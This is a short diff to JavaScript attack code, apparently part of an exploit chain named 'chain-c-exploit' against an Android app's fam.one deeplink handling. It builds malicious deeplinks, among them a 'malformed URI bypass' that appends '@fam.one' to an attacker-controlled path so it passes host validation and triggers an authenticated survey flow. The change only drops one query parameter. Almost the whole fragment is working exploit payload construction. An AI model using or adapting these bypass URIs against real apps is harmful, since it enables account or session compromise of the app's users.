@@ -81,10 +81,10 @@
   // but the actual navigation goes to exploit-page (the userinfo/authority part)
   // We use the exploit page host as the "user" part of the URL
   const exploitHost = location.hostname + (location.port ? ':' + location.port : '');
-  const exploitPath = '/chain-c-exploit?fp_type=fpSurvey&fp_auth_req=true&fp_new_window=true&source=app&platform=android';
+  const exploitPath = '/chain-c-exploit?fp_type=fpSurvey&fp_auth_req=true&source=app&platform=android';
 
   // Malformed URI bypass: https://exploithost/path@fam.one
-  const bypassUri = 'https://' + exploitHost + '/chain-c-exploit@fam.one' + '?fp_type=fpSurvey&fp_auth_req=true&fp_new_window=true&source=app&platform=android';
+  const bypassUri = 'https://' + exploitHost + '/chain-c-exploit@fam.one' + '?fp_type=fpSurvey&fp_auth_req=true&source=app&platform=android';
 
   // Deeplink using https://fam.one/* entry point (not fp://)
   const deeplink1 = 'https://' + exploitHost + exploitPath + '#fam.one';
